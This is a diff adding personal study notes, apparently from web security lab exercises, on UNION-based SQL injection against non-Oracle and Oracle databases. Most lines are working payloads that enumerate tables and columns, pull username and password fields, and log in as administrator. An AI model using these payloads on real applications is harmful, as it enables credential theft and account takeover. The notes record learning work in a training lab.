@@ -72,3 +72,33 @@ for microsoft @@version
 ex:'+UNION+SELECT+@@version,NULL#
 
 ### SQL injection attack, listing the database contents on non-Oracle databases
+
+Hint: You can find some useful payloads on our SQL injection cheat sheet.  
+proxy -> intercept -> repeater  
+Non-oracle -- -> NULL NULL enumerate until columns found, then string search.  
+Grab name of tables we want username/passwords table_name keyword information_schema.tables keyword  
+ex: '+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--  
+Show response in browser -> ctrl+f 'users' save user custom name
+search column_name and information.schema.columns Where table_name= usercustomName
+'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_zleagd'--
+find name of username column and password column -> ex: password_ozeovi username_oiwhns
+Then make UNION select with username, password, FROM, usertable
+ex: '+UNION+SELECT+username_oiwhns,password_ozeovi+FROM+users_zleagd--
+grab username/password for administrator
+Login from Myaccount
+
+### SQL injection attack, listing the database contents on Oracle
+
+proxy-intercept-repeater - ORACLE (+FROM+dual) instead of --
+enumerate nulls for columns '+UNION+SELECT+NULL,NULL+FROM+dual--
+test strings - both are strings
+Grab name of tables we want username/passwords table_name keyword all_tables keyword for ORACLE
+ex: '+UNION+SELECT+table_name,NULL+FROM+all_tables--
+get users table info - USERS_ICXPNX
+search column_name and ORACLE: all_tab_columns using our username table to filter via WHERE clause
+'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ICXPNX'--
+Then make UNION select with username, password, FROM, usertable
+PASSWORD_TYRFNT
+USERNAME_AIPDKN
+'+UNION+SELECT+USERNAME_AIPDKN,PASSWORD_TYRFNT+FROM+USERS_ICXPNX--
+Log in using administrator and password.
